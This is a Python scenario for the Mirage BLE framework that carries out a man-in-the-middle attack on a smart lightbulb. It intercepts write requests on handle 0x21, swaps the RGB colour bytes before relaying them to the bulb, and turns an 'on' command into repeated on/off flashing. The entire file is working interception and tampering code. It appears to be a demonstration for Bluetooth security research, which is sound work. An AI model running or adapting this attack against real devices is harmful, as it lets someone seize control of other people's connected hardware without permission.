from mirage.core import scenario
from mirage.libs import io,ble,utils

class lightbulb_mitm(scenario.Scenario):

	# When the module starts...
	def onStart(self):
		self.a2sEmitter = self.module.a2sEmitter
		self.a2sReceiver = self.module.a2sReceiver
		self.a2mEmitter = self.module.a2mEmitter
		self.a2mReceiver = self.module.a2mReceiver

	# When we receive a Write Request ...
	def onMasterWriteRequest(self,packet):

		# Changing RGB values
		if packet.handle == 0x21 and b"\x55\x13" in packet.value:
			print(packet)
			value = (packet.value[0:2] +
				bytes([packet.value[4],packet.value[2],packet.value[3]]) +
				b"\r\n")
			io.info("Changing RGB values ...")
			self.a2sEmitter.sendp(ble.BLEWriteRequest(
						handle=packet.handle,
						value=value)
					)
			return False

		# Changing on/off packets
		elif packet.handle == 0x21 and b"\x55\x10\x01\x0d\x0a" == packet.value:
			for _ in range(3):
				io.info("Day !")
				self.a2sEmitter.sendp(ble.BLEWriteCommand(
							handle=packet.handle,
							value = b"\x55\x10\x01\x0d\x0a")
							)
				utils.wait(seconds=1)
				io.info("Night !")
				self.a2sEmitter.sendp(ble.BLEWriteCommand(
							handle=packet.handle,
							value = b"\x55\x10\x00\x0d\x0a")
							)
				utils.wait(seconds=1)
		return True
